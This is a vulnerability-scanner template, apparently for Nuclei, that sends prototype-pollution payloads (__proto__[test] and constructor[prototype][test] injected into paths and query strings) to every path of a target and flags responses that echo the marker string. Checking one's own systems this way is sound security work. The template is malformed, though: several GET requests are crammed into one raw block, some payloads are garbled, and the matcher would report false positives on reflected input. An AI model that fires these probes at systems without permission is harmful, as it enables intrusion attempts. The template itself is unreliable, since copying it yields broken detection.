id: advanced-comprehensive-prototype-pollution-check

info:
  name: Advanced Comprehensive Prototype Pollution Detection
  author: Mammad Rahimzada
  severity: high
  description: Automatically sends various advanced payloads to all paths and checks for potential prototype pollution.

requests:
  - raw:
      - |
        GET {{BaseURL}}/__proto__[test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}
        GET {{BaseURL}}/constructor[prototype][test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}
        GET {{BaseURL}}/?__proto__[test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}
        GET {{BaseURL}}/?constructor[prototype][test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}
        GET {{BaseURL}}/?polluter=__proto__&value=[test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}
        GET {{BaseURL}}/?polluter=constructor[prototype]&value=[test]=prototype_pollution HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "prototype_pollution"
        part: body
